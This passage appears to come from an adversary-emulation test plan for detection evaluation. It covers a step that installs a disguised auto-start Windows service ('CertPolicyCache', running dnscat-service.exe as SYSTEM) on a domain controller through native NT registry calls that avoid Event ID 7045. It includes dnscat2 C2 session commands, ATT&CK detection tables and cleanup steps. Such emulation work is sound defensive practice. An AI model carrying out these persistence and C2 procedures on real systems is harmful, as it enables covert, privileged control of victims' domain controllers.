  command (dc01) 5> whoami
  ```

  - ***Expected Output***

    ```text
    nt authority\system
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Persistence | T1543.003 | Create or Modify System Process: Windows Service | Windows | `ServiceInstaller.exe` creates Windows service `CertPolicyHost` on DC01 with `ImagePath = C:\ProgramData\dnscat-service.exe`; System Event ID 7045 records the service install; service key exists at `HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyHost` with `Start = 2` and `ObjectName = LocalSystem` | Calibrated - Not Benign | `ServiceInstaller.exe install` calls SCM APIs directly to create an auto-start service for `dnscat-service.exe`; the persistent service object is independently verifiable through Event ID 7045 and the service registry key | DC01 | TESTLAB\Administrator | [ServiceInstaller.exe](../resources/payloads/windows-service/advapi32-cpp/ServiceInstaller.exe), [service_installer.cpp](../resources/payloads/windows-service/advapi32-cpp/service_installer.cpp) | -
| Execution | T1569.002 | System Services: Service Execution | Windows | `services.exe` starts `C:\ProgramData\dnscat-service.exe` as service `CertPolicyHost`; System Event ID 7036 records service running state | Not Calibrated - Not Benign | Start substep: `ServiceInstaller.exe start CertPolicyHost` triggers SCM to launch the already-created persistence service; execution confirms the service works but the scored behavior is the persistent service creation in T1543.003 | DC01 | NT AUTHORITY\SYSTEM | [service_installer.cpp StartServiceByName()](../resources/payloads/windows-service/advapi32-cpp/service_installer.cpp) | -

---

## Step 10 — Registry-Backed Windows Service Persistence (T1543.003, T1106)

### Voice Track

`NtServiceInstaller.exe` creates a second auto-start Windows service without calling
`CreateServiceW`. Instead, it opens
`\Registry\Machine\SYSTEM\CurrentControlSet\Services`, creates a service subkey, and
writes the service configuration with native NT registry APIs (`NtOpenKey`,
`NtCreateKey`, and `NtSetValueKey`).

This branch produces a different telemetry surface than Step 9. The primary artifact is
the service registry key itself, not an SCM service creation event: the install path
writes `HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyCache` with `Type = 16`,
`Start = 2`, `ImagePath = C:\ProgramData\dnscat-service.exe`, and
`ObjectName = LocalSystem`. Because SCM does not receive a normal `CreateServiceW`
request, the service may not be available through SCM until reboot or service database
refresh. This makes the branch useful for evaluating registry-backed service
persistence that does not rely on Event ID 7045.

### Procedures

- ☣️ From the DC01 dnscat2 shell, create the registry-backed service

  ```text
  C:\ProgramData> NtServiceInstaller.exe install C:\ProgramData\dnscat-service.exe CertPolicyCache "Certificate Policy Cache" "Caches certificate policy metadata"
  ```

  - ***Expected Output***

    ```text
    Service key created (disposition: <n>)
    Service 'CertPolicyCache' installed successfully via NT syscalls
    Note: Service requires system reboot or manual SCM refresh to appear
    ```

- ☣️ Verify the service registry configuration

  ```text
  C:\ProgramData> reg query HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyCache /v ImagePath
  C:\ProgramData> reg query HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyCache /v Start
  C:\ProgramData> reg query HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyCache /v ObjectName
  ```

  - ***Expected Output***

    ```text
    ImagePath    REG_SZ    C:\ProgramData\dnscat-service.exe
    Start        REG_DWORD 0x2
    ObjectName   REG_SZ    LocalSystem
    ```

- ☣️ Trigger: reboot DC01 during the planned test window or wait for SCM refresh, then confirm the service-backed C2 session

  ```text
  dnscat2> New session established: <session-id>
  dnscat2> session -i <session-id>
  command (dc01) 6> whoami
  ```

  - ***Expected Output***

    ```text
    nt authority\system
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Persistence | T1543.003 | Create or Modify System Process: Windows Service | Windows | `NtServiceInstaller.exe` creates registry key `HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyCache` on DC01 with `ImagePath = C:\ProgramData\dnscat-service.exe`, `Start = 2`, `Type = 16`, and `ObjectName = LocalSystem`; Sysmon Event IDs 12/13 record service key and value creation | Calibrated - Not Benign | `NtServiceInstaller.exe install` creates an auto-start service by writing the service configuration directly to the Services registry hive; the persistent service definition is independently verifiable even when System Event ID 7045 is absent | DC01 | TESTLAB\Administrator | [NtServiceInstaller.exe](../resources/payloads/windows-service/syscalls-cpp/NtServiceInstaller.exe), [service_installer.cpp](../resources/payloads/windows-service/syscalls-cpp/service_installer.cpp) | -
| Execution | T1106 | Native API | Windows | `NtServiceInstaller.exe` loads `ntdll.dll` and uses native registry APIs (`NtOpenKey`, `NtCreateKey`, `NtSetValueKey`) to write the service configuration instead of calling `CreateServiceW` | Not Calibrated - Not Benign | Implementation detail: native NT APIs are used to bypass the normal SCM service creation path; the scored artifact is the persistent service registry key captured by T1543.003 | DC01 | TESTLAB\Administrator | [nt_api.cpp](../resources/payloads/windows-service/syscalls-cpp/nt_api.cpp), [service_installer.cpp](../resources/payloads/windows-service/syscalls-cpp/service_installer.cpp) | -
| Persistence | T1112 | Modify Registry | Windows | Registry values under `HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyCache` are created or modified: `Type`, `Start`, `ErrorControl`, `ImagePath`, `DisplayName`, and `ObjectName` | Not Calibrated - Not Benign | Registry modification is the mechanism used to create the Windows service; this would double-count the same persistent service artifact already represented by T1543.003 | DC01 | TESTLAB\Administrator | [service_installer.cpp InstallService()](../resources/payloads/windows-service/syscalls-cpp/service_installer.cpp) | -

---

## End of Test

### Procedures

---

- ☣️ Terminate the DC01 dnscat2 C2 session from the attacker machine

  ```text
  dnscat2> session -k <dc01-session-id>
  ```

- Remove dropped artifacts on DC01

  | Artifact | Location |
  | - | - |
  | `CertEnrollAgent.exe` | `C:\ProgramData\` |
  | `CertCA.bin` | `C:\ProgramData\` (auto-deleted by Herpaderping) |
  | `HD*.tmp` (Herpaderping temp file) | `C:\Windows\Temp\` |
  | `ls.txt` (if verify step was run) | `C:\Windows\Temp\` |
  | `dnscat2.exe` | `C:\ProgramData\` |
  | `dnscat-service.exe` | `C:\ProgramData\` |
  | `ServiceInstaller.exe` | `C:\ProgramData\` |
  | `NtServiceInstaller.exe` | `C:\ProgramData\` |

- Remove persistence artifacts on DC01 (if tearing down)

  | Artifact | How to remove |
  | - | - |
  | `CertPolicyHost` Windows service | `sc stop CertPolicyHost && sc delete CertPolicyHost` |
  | `CertPolicyCache` registry-backed Windows service | `sc stop CertPolicyCache && sc delete CertPolicyCache` or `reg delete HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyCache /f` before reboot |
  | WMI subscription (`CertPolicyFilter` / `CertPolicyConsumer`) | `Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding \| Remove-WmiObject` then same for `__EventFilter` and `CommandLineEventConsumer` |

- Remove staging artifacts on IIS01

  | Artifact | Location |
  | - | - |
  | `CertCA.bin` | `C:\ProgramData\` |
  | `CertEnrollAgent.exe` | `C:\ProgramData\` |
  | `go-thehash.exe` | `C:\ProgramData\` |
  | `ServiceInstaller.exe` | `C:\ProgramData\` |
  | `NtServiceInstaller.exe` | `C:\ProgramData\` |
  | `dnscat2.b64`, `CertEnrollAgent.b64`, `go-thehash.b64`, `ServiceInstaller.b64`, `NtServiceInstaller.b64` | `C:\Windows\Temp\` |
  | `ls.txt` (if verify step was run) | attacker working directory |

- Remove encoded payloads from the attacker machine's react2shell tool directory

  | File |
  | - |
  | `resources/payloads/react2shell-tool/dnscat2.b64` |
  | `resources/payloads/react2shell-tool/CertEnrollAgent.b64` |
  | `resources/payloads/react2shell-tool/go-thehash.b64` |
  | `resources/payloads/react2shell-tool/ServiceInstaller.b64` |
  | `resources/payloads/react2shell-tool/NtServiceInstaller.b64` |
